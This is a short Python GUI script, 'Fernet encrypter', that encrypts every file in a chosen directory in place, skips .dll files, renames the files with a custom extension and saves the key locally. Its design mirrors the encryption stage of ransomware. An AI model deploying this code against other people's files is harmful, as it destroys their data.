import os
from cryptography.fernet import Fernet
import tkinter
from tkinter import filedialog as fd
import datetime

key = Fernet.generate_key()
uniqKey = str(datetime.datetime.now()).replace(" ", "").replace("-", "").replace(":", "").replace(".", "")

fileLists = []
foldername = 'testfolder'

def sendkey():
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def choseDir():
    global foldername
    foldername=fd.askdirectory(parent=root,initialdir="/",title='Pick a directory')

def findfile():
    global EXT
    EXT = EXT_entry.get()
    if not EXT:
        EXT = ".sasa"
    EXCLUDED_EXT = (EXT, '.dll')
    for (root,dirs,file) in os.walk(foldername, topdown=True):
        for files in file:
            if not files.endswith(EXCLUDED_EXT):
                files = os.path.join(root, files)
                fileLists.append(files)

def encryptme():
    sendkey()
    findfile()
    for files in fileLists:
        with open(str(files), "rb") as f:
            data = f.read()
        with open(str(files), "wb") as f:
            encryptData = Fernet(key).encrypt(data)
            f.write(encryptData)
        os.rename(str(files), files+EXT)
    root.quit()

if 1:
    root=tkinter.Tk()
    root.title('Fernet encrypter')
    root.geometry('350x220')
    root.resizable(0,0)
    tkinter.Label(root,text=f' Made by Sabbir Ahmed\ngithub.com/sabbir-21\n\nHelp: Default directory "testfolder"',font= ("Times New Roman", 10)).pack()
    tkinter.Label(root, text='Enter Crypter extention:',fg='green').pack()
    EXT_entry = tkinter.Entry(root, width=15)
    EXT_entry.insert(0, '.sasa')
    EXT_entry.pack(pady=5)
    tkinter.Button(root,text='Select Directory',command=choseDir).pack(pady=1)
    tkinter.Button(root,text='Encrypt my files',command=encryptme, fg='white', bg='red').pack(pady=15)
    root.mainloop()
